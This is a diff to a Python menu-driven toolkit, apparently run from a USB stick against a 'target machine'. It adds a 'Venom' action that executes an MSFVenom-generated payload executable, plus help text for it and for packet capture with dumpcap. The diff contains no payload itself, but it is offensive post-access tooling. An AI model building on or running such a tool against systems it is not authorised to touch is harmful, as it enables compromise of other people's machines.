@@ -137,6 +137,8 @@ while True:
     sleep(0.1)
     print("PacketCapture) Capture network packets on target machine")
     sleep(0.1)
+    print("Venom) Run a Venom payload")
+    sleep(0.1)
     print(" ")
     sleep(0.1)
     print("exit) To exit the program")
@@ -229,6 +231,12 @@ while True:
         sleep(0.1)
         print("")
         sleep(0.1)
+        print("PacketCapture) Capture network packets on target machine using dumpcap (part of Wireshark installation)")
+        sleep(0.1)
+        print("")
+        print("Venom) Run a Venom payload: allows execution of a specified Venom-generated payload on the target machine")
+        sleep(0.1)
+        print("")
         print("exit) To exit the program")
         sleep(0.1)
         print("")
@@ -959,6 +967,11 @@ while True:
 #
 #
     
+    if action == "Venom":
+        logging.info(f"Chosen action Venom to run a Venom payload")
+        venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
+        run_ps(venom)
+
    #Action exit = exiting the program
     if action == "exit":
         logging.info(f"Chosen action PassExport to exit the program")
@@ -1068,6 +1081,14 @@ while True:
     
     if action == "info PacketCapture":
         print("PacketCapture) Capture packets on target machine: uses Wireshark's dumpcap to capture network packets on a specified interface and save them to a pcapng file") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info Venom":
+        print("Venom) Run a Venom payload: allows the execution of an .exe file which was generated using MSFVenom and saved into VenomPayload using attackersetup.sh") 
         sleep(0.1) 
         print("")
         sleep(0.1)
